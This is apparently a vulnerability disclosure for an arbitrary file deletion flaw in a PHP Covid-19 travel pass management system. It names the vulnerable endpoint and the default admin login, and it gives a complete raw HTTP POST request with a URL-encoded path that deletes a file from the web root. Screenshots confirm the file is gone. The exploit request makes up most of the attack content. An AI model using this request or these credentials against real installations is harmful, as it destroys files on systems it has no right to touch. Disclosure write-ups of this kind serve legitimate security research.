# Covid-19 Travel Pass Management System v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: /ctpms/classes/Master.php?f=delete_img

Vulnerability location: /ctpms/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shel.php file in the root directory

```sql
POST /ctpms/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=sbd29ujtf9eelnf4f6rlt8ikfi
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

path=C%3A%5Cxampp%5Chtdocs%5Cctpms%5Cshell.php
```
The file path needs to be encoded by url
![image](https://user-images.githubusercontent.com/54017627/167078870-f20ffa4d-f8d1-4b1c-a050-6504f6684023.png)

At present, the shell.php file is still in the root directory of the website, when we send a request to delete the shell.php file

![image](https://user-images.githubusercontent.com/54017627/167078929-8c72b11e-52bf-485b-8901-66b309b71c40.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/167078977-11c59f39-222c-43cc-857d-0f5ea5df9006.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/167079021-b3064c1d-b820-4a1a-a222-d1b3c73b0378.png)
